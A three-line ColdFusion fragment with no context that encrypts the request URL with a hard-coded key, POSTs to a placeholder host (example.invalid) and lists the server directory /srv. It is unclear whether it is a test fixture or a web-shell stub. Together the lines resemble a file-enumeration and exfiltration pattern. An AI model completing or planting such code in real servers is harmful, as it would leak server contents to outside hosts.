<cfset a=encrypt(getPageContext().getRequest().getRequestURL().toString(),"key","AES")>
<cfhttp url="https://example.invalid/" method="POST">
<cfdirectory name="listing" directory="/srv" action="list">
